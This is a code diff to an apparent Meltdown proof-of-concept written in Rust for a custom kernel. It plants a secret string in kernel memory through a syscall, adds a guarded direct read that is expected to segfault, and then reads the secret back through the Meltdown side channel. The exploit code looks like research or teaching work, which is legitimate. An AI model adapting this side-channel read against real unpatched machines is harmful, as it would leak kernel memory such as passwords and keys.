@@ -22,6 +22,7 @@ use sjlj::{setjmp, longjmp, JumpBuf};
 use spin::{Mutex};
 
 static jump_buf: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
+static jump_buf_direct_read: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
 
 const PAGE_SIZE: usize = 256;
 
@@ -175,7 +176,6 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 		}
 		syscall(ThreadSwitch, &[]); // Apparently this is important, see above
 	}
-	println!("All values were 0");
 	return 0; // Maybe this means to only return 0 (first entry) after ensuring it was not one of the other values?
 }
 
@@ -322,7 +322,26 @@ pub fn main() {
 	
 	const secret_string: &str = "Whoever reads this is dumb.";
 	let SECRET = syscall(MeltdownCopyToKernelMemory, &[secret_string.as_ptr() as usize, secret_string.len() as usize]).expect("Syscall did not return value of secret in kernel space!") as *const u8;
-	print!("Trying to read secret from address {:?}.\nGot: ", SECRET);
+	
+	println!("Trying to read secret from address {:?} directly, expecting segmentation fault", SECRET);
+	let secret_string_kernel;
+	unsafe {
+		secret_string_kernel = String::from_raw_parts(SECRET as *mut u8, secret_string.len(), secret_string.len());
+	}
+	
+	println!("Successfully created string object, trying to read secret...");
+	
+	unsafe {
+		if setjmp(&mut *jump_buf_direct_read.lock()) == 0 {
+			println!("{}", secret_string_kernel);
+			println!("No segmentation fault!");
+		} else {
+			println!("Got segmentation fault!");
+			jump_buf_direct_read.force_unlock();
+		}
+	}
+	
+	print!("Trying to read secret from address {:?} using meltdown...\nExpected:{}\n     Got: ", SECRET, secret_string);
 	
 	let mut index: usize = 0;
 	while index < secret_string.len() {
